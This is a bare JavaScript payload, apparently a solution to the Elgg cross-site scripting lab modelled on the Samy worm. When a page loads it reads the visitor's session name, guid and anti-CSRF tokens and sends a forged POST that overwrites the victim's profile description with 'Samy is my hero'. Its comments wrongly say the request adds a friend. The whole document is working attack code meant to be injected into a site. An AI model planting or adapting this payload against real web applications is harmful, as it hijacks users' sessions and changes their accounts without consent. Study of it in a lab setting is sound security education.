<script type="text/javascript">
window.onload = function () {
var user = elgg.session.user.name;
if(user != 'Samy'){
    var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="__elgg_token="+elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit";  
    //Create and send Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
      Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
      var content=token+ts+"&name="+elgg.session.user.name+"&description=Samy is my hero&guid="+elgg.session.user.guid;
      Ajax.send(content);
}
} </script>
